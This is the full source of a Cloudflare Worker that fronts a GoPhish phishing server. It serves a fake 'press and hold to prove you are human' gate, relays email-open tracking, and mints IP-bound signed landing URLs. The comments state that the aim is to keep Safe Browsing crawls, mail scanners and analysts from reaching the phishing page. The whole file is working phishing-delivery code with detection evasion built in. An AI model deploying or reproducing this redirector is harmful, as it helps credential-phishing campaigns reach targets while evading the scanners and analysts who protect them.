/*
 * gophish-redirector — Cloudflare Worker
 *
 * Sits in front of the GoPhish phishing server. Bot defense is a single
 * visible press-and-hold gesture: the click page shows a button the visitor
 * must hold for ~1.2s. Only on completion does the page POST to /__verify and
 * get redirected to the landing page. Non-JS scanners and link-prefetchers
 * never run the script or perform the held-pointer gesture, so they never
 * reach GoPhish. There is no User-Agent, ASN, or environment fingerprinting.
 *
 * Authentication to GoPhish is via an IP-bound signed URL. After the bot
 * checks pass, the Worker appends id and sig = HMAC-SHA256(secret,
 * id + "." + CF-Connecting-IP) to the landing URL it sends to GoPhish.
 * Because both the Worker and GoPhish sit behind Cloudflare, GoPhish sees
 * the same client IP in the same header and recomputes an identical
 * signature. There is no expiry: a visitor reloading from the same IP is
 * served indefinitely, while the same URL replayed from any other network —
 * a Safe Browsing verification crawl, a mail scanner, an analyst — computes
 * a different IP, fails the signature, and is dead-ended to PHISH_ORIGIN/404.
 *
 * The server-side-fetched /hi endpoint is signed against the id alone
 * (sig = HMAC-SHA256(secret, id)), because the Worker — not the target's
 * browser — issues that request, so the IP GoPhish sees on it is the
 * Worker's, not the visitor's.
 *
 * Endpoints:
 *   /<anything>/hi?id=<rid>   → tracking pixel. Worker fires a
 *                               server-side GET to GoPhish's /hi to log
 *                               the open event, then returns 204 to the
 *                               mail client. No bot check, no JS.
 *   /<anything>?id=<rid>      → click. Serves the press-and-hold page.
 *   /__verify?id=<rid>        → gesture completion (POST). Mints the
 *                               IP-bound landing URL and returns it as
 *                               {target} JSON.
 *
 * Any request without a valid ?id= is 302-redirected to PHISH_ORIGIN/404
 * (which GoPhish in turn sends to its configured not_found_redirect_url).
 *
 * Env vars (configure in Cloudflare dashboard → Workers → Settings → Variables):
 *   SECRET            64-char hex string. Must match
 *                     phish_server.redirector.secret in GoPhish config.json.
 *   PHISH_ORIGIN      e.g. https://phish.example.com (no trailing slash needed)
 */

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const origin = (env.PHISH_ORIGIN || '').replace(/\/+$/, '');
    const rid = url.searchParams.get('id');
    if (!rid) return notFound(origin);

    const key = await importHmacKey(env.SECRET);

    // /hi tracking pixel — Worker fires a server-side GET, returns 204.
    if (/\/hi$/.test(url.pathname)) {
      const target = `${origin}${url.pathname}?${await signedParams(rid, key)}`;
      ctx.waitUntil(fetch(target, { method: 'GET' }).catch(() => {}));
      return new Response(null, {
        status: 204,
        headers: { 'Cache-Control': 'no-store' },
      });
    }

    // Gesture-completion endpoint.
    if (url.pathname === '/__verify') {
      return handleVerify(request, rid, key, origin);
    }

    // Click path — serve the press-and-hold page.
    return new Response(pressHoldHTML(rid), {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
        'Referrer-Policy': 'no-referrer',
        'X-Robots-Tag': 'noindex, nofollow',
      },
    });
  },
};

// ─────────────────────────────────────────────────────────────────────
// /__verify — press-and-hold completion handler
// ─────────────────────────────────────────────────────────────────────

async function handleVerify(request, rid, key, origin) {
  if (request.method !== 'POST') {
    return new Response(null, { status: 405 });
  }

  let body = {};
  try {
    body = await request.json();
  } catch (e) {
    // Tolerate a missing/garbled body — fall back to the root path below.
  }

  // Mint the IP-bound signed target URL on the original path. The
  // signature binds to this visitor's CF-Connecting-IP; the landing GET that
  // follows travels victim → Cloudflare → gophish, so gophish sees the same
  // IP and validates. A replay from any other network will not.
  const ip = request.headers.get('CF-Connecting-IP') || '';
  const path = sanitizePath(body && body.path);
  const target = `${origin}${path}?${await signedParamsIP(rid, ip, key)}`;
  return jsonResponse({ target }, 200);
}

// sanitizePath restricts the path the JS can ask the Worker to redirect
// to. Must start with /, must not contain "//" (which would be a host
// override in some parsers), must not contain "?" or "#".
function sanitizePath(p) {
  if (typeof p !== 'string' || p.length === 0) return '/';
  if (p[0] !== '/') return '/';
  if (p.indexOf('//') !== -1) return '/';
  if (p.indexOf('?') !== -1 || p.indexOf('#') !== -1) return '/';
  return p;
}

// ─────────────────────────────────────────────────────────────────────
// Signed URL
// ─────────────────────────────────────────────────────────────────────

async function importHmacKey(hexSecret) {
  return crypto.subtle.importKey(
    'raw',
    hexToBytes(hexSecret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
}

// sign returns the hex HMAC-SHA256(secret, msg). The exact byte sequence of
// msg must match what the gophish side hashes, or the comparison fails.
async function sign(msg, key) {
  const sigBuf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(msg));
  return toHex(new Uint8Array(sigBuf));
}

// signedParams returns "id=<rid>&sig=<hex>" where sig = HMAC(secret, rid).
// Used for the /hi endpoint the Worker fetches server-side: the IP gophish
// sees on it is the Worker's, not the visitor's, so it is bound to the rid
// alone.
async function signedParams(rid, key) {
  const sig = await sign(rid, key);
  return `id=${encodeURIComponent(rid)}&sig=${sig}`;
}

// signedParamsIP returns "id=<rid>&sig=<hex>" where sig =
// HMAC(secret, rid + "." + ip). Used for the landing URL handed to the
// visitor's browser: gophish recomputes it against the CF-Connecting-IP it
// sees, so only a request from the same client IP validates. The "."
// delimiter and the raw IP string must match the gophish side exactly.
async function signedParamsIP(rid, ip, key) {
  const sig = await sign(rid + '.' + ip, key);
  return `id=${encodeURIComponent(rid)}&sig=${sig}`;
}

// ─────────────────────────────────────────────────────────────────────
// helpers
// ─────────────────────────────────────────────────────────────────────

function hexToBytes(hex) {
  const clean = (hex || '').trim();
  const out = new Uint8Array(clean.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = parseInt(clean.substr(i * 2, 2), 16);
  }
  return out;
}

function toHex(bytes) {
  return [...bytes].map(b => b.toString(16).padStart(2, '0')).join('');
}

function jsonResponse(obj, status) {
  return new Response(JSON.stringify(obj), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Cache-Control': 'no-store',
    },
  });
}

// notFound 302-redirects to PHISH_ORIGIN/404. Used for any request without a
// valid ?id=. GoPhish has no /404 route, so the catch-all rejects it (no valid
// signature) and forwards to its configured not_found_redirect_url.
function notFound(origin) {
  return new Response(null, {
    status: 302,
    headers: { 'Location': `${origin}/404`, 'Cache-Control': 'no-store' },
  });
}

// ─────────────────────────────────────────────────────────────────────
// Press-and-hold page
// ─────────────────────────────────────────────────────────────────────

// HOLD_MS is the duration the button must be held before the gesture
// completes and the page POSTs to /__verify.
const HOLD_MS = 1200;

function pressHoldHTML(rid) {
  const ridJSON = JSON.stringify(rid);
  return `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow">
<title>Before we continue…</title>
<style>
:root {
  --color-primary-10:  #E9F5FF;
  --color-primary-20:  #D3EAFF;
  --color-primary-60:  #50A6F7;
  --color-primary-100: #0F69BD;
  --color-primary-140: #004483;
  --color-primary-160: #002D57;

  --color-secondary-20: #E3FBDA;
  --color-secondary-60: #AAED93;

  --color-neutral-00:  #FFFFFF;
  --color-neutral-05:  #F2F3F3;
  --color-neutral-10:  #E6E7E8;
  --color-neutral-20:  #CCCFD0;
  --color-neutral-40:  #999EA1;
  --color-neutral-50:  #80868A;
  --color-neutral-60:  #666E72;
  --color-neutral-70:  #4D565B;
  --color-neutral-80:  #333D43;
  --color-neutral-100: #000D14;

  --color-success-100: #227007;

  --fg-1: var(--color-neutral-100);
  --fg-2: var(--color-neutral-70);
  --fg-3: var(--color-neutral-60);

  --bg-1: var(--color-neutral-00);
  --bg-2: var(--color-neutral-05);

  --interactive: var(--color-primary-100);
  --focus-ring: color-mix(in srgb, var(--color-primary-100) 45%, transparent);

  --radius-full: 9999px;

  --space-2: 8px;
  --space-3: 12px;
  --space-6: 24px;
  --space-8: 32px;

  --font-sans: "Noto Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;

  --text-h4-size: 24px;   --text-h4-lh: 32px;
  --text-body-size: 16px; --text-body-lh: 24px;
  --text-body2-size: 14px;--text-body2-lh: 20px; --text-body2-weight: 400;

  --ease-standard: cubic-bezier(0.2, 0, 0, 1);
  --ease-exit: cubic-bezier(0.4, 0, 1, 1);
  --dur-fast: 120ms;
  --dur-base: 180ms;
  --dur-slow: 280ms;
}

*, *::before, *::after { box-sizing: border-box; }
html, body { margin: 0; min-height: 100%; }
html, body {
  font-family: var(--font-sans);
  color: var(--fg-1);
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}
body {
  min-height: 100dvh;
  display: grid;
  place-items: center;
  padding: var(--space-8);
  background: var(--color-neutral-00);
  color: var(--fg-1);
}

.frame {
  width: 100%;
  max-width: 300px;
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
}

.intro h1 {
  font: 700 var(--text-h4-size)/var(--text-h4-lh) var(--font-sans);
  margin: 0 0 var(--space-3) 0;
  color: var(--color-neutral-80);
  letter-spacing: -0.01em;
}
.intro p {
  margin: 0 0 var(--space-8) 0;
  font: var(--text-body2-weight) var(--text-body2-size)/var(--text-body2-lh) var(--font-sans);
  color: var(--fg-3);
  text-wrap: balance;
}

.hold {
  --pill-border: color-mix(in srgb, var(--color-primary-60) 42%, var(--color-neutral-20));
  position: relative;
  width: 100%;
  padding: var(--space-3) var(--space-6);
  border: 1.5px solid var(--pill-border);
  border-radius: var(--radius-full);
  background: var(--color-neutral-00);
  font-family: var(--font-sans);
  cursor: pointer;
  overflow: hidden;
  isolation: isolate;
  -webkit-tap-highlight-color: transparent;
  touch-action: none;
  transition: border-color var(--dur-base) var(--ease-standard),
              box-shadow var(--dur-base) var(--ease-standard),
              transform var(--dur-fast) var(--ease-standard);
}
.hold:hover { border-color: var(--color-primary-60); }
.hold:focus-visible {
  outline: none;
  border-color: var(--interactive);
  box-shadow: 0 0 0 3px var(--focus-ring);
}
.hold[data-state="holding"] { border-color: var(--interactive); }
.hold[data-state="verified"] {
  border-color: var(--color-secondary-60);
  cursor: default;
}
.hold[data-state="verifying"] { cursor: progress; }

.fill {
  position: absolute;
  inset: 0;
  width: 0%;
  background: var(--color-primary-10);
  z-index: -1;
}
.hold[data-state="early"] .fill { transition: width var(--dur-slow) var(--ease-exit); }
.hold[data-state="verified"] .fill,
.hold[data-state="verifying"] .fill { background: var(--color-secondary-20); }

.hold-label {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: var(--space-2);
  font: 600 var(--text-body-size)/var(--text-body-lh) var(--font-sans);
  color: var(--interactive);
  transition: color var(--dur-base) var(--ease-standard);
}
.hold[data-state="verified"] .hold-label { color: var(--color-success-100); }

.tick {
  width: 18px; height: 18px;
  fill: none;
  stroke: currentColor;
  stroke-width: 2.5;
  stroke-linecap: round;
  stroke-linejoin: round;
  display: none;
}
.hold[data-state="verified"] .tick { display: inline-block; }
.tick path { stroke-dasharray: 24; stroke-dashoffset: 24; }
.hold[data-state="verified"] .tick path {
  transition: stroke-dashoffset var(--dur-slow) var(--ease-standard) 60ms;
  stroke-dashoffset: 0;
}

.spin {
  width: 16px; height: 16px;
  border: 2px solid var(--color-primary-20);
  border-top-color: var(--interactive);
  border-radius: var(--radius-full);
  display: none;
  animation: spin 0.7s linear infinite;
}
.hold[data-state="verifying"] .spin { display: inline-block; }
@keyframes spin { to { transform: rotate(360deg); } }

@media (prefers-reduced-motion: reduce) {
  .spin { animation-duration: 1.2s; }
}
</style>
</head>
<body>
  <main class="frame">
    <div class="intro">
      <h1>Before we continue...</h1>
      <p>Press &amp; Hold to confirm you are a human (and not a bot).</p>
    </div>

    <button type="button" class="hold" id="check" aria-label="Press and hold to confirm you are a human" data-state="idle">
      <span class="fill" id="fill" aria-hidden="true"></span>
      <span class="hold-label">
        <span class="spin" aria-hidden="true"></span>
        <svg class="tick" viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12.5l4.2 4.2L19 7"></path></svg>
        <span id="leadText">Press &amp; Hold</span>
      </span>
    </button>
  </main>

<script>
(function () {
  var RID = ${ridJSON};
  var HOLD_MS = ${HOLD_MS};

  var btn = document.getElementById('check');
  var fill = document.getElementById('fill');
  var lead = document.getElementById('leadText');

  var state = 'idle';
  var holding = false;
  var rafId = null;
  var startTs = 0;
  var progress = 0;
  var earlyTimer = null;

  function setFill(p) {
    progress = Math.max(0, Math.min(1, p));
    fill.style.width = (progress * 100).toFixed(2) + '%';
  }
  function setState(s) { state = s; btn.setAttribute('data-state', s); }

  function tick(ts) {
    if (!holding) return;
    if (!startTs) startTs = ts;
    setFill((ts - startTs) / HOLD_MS);
    if (progress >= 1) { complete(); return; }
    rafId = requestAnimationFrame(tick);
  }

  function startHold() {
    if (state === 'verified' || state === 'verifying' || holding) return;
    if (earlyTimer) { clearTimeout(earlyTimer); earlyTimer = null; }
    holding = true;
    startTs = 0;
    setState('holding');
    rafId = requestAnimationFrame(tick);
  }

  function cancelHold() {
    if (!holding) return;
    holding = false;
    if (rafId) cancelAnimationFrame(rafId);
    setState('early');
    setFill(0);
    if (earlyTimer) clearTimeout(earlyTimer);
    earlyTimer = setTimeout(function () {
      if (state === 'early') { setState('idle'); lead.textContent = 'Press & Hold'; }
    }, 600);
  }

  function complete() {
    holding = false;
    if (rafId) cancelAnimationFrame(rafId);
    setFill(1);
    setState('verifying');
    lead.textContent = 'Verifying…';
    fetch('/__verify?id=' + encodeURIComponent(RID), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ path: location.pathname })
    }).then(function (r) {
      return r.ok ? r.json() : null;
    }).then(function (d) {
      if (d && d.target) {
        setState('verified');
        lead.textContent = 'Verified';
        btn.setAttribute('aria-label', 'Verified — you are human');
        location.replace(d.target);
        return;
      }
      throw new Error('no target');
    }).catch(function () {
      setState('idle');
      setFill(0);
      lead.textContent = 'Try again';
    });
  }

  btn.addEventListener('pointerdown', function (e) {
    if (e.button !== undefined && e.button !== 0) return;
    e.preventDefault();
    try { btn.setPointerCapture(e.pointerId); } catch (err) {}
    startHold();
  });
  btn.addEventListener('pointerup', function () { cancelHold(); });
  btn.addEventListener('pointercancel', function () { cancelHold(); });
  btn.addEventListener('lostpointercapture', function () { cancelHold(); });
  btn.addEventListener('contextmenu', function (e) { e.preventDefault(); });

  var keyHeld = false;
  btn.addEventListener('keydown', function (e) {
    if (e.key === ' ' || e.key === 'Enter' || e.code === 'Space') {
      e.preventDefault();
      if (keyHeld) return;
      keyHeld = true;
      startHold();
    }
  });
  btn.addEventListener('keyup', function (e) {
    if (e.key === ' ' || e.key === 'Enter' || e.code === 'Space') {
      keyHeld = false;
      cancelHold();
    }
  });
  btn.addEventListener('blur', function () {
    if (keyHeld) { keyHeld = false; cancelHold(); }
  });
})();
</script>
</body></html>`;
}
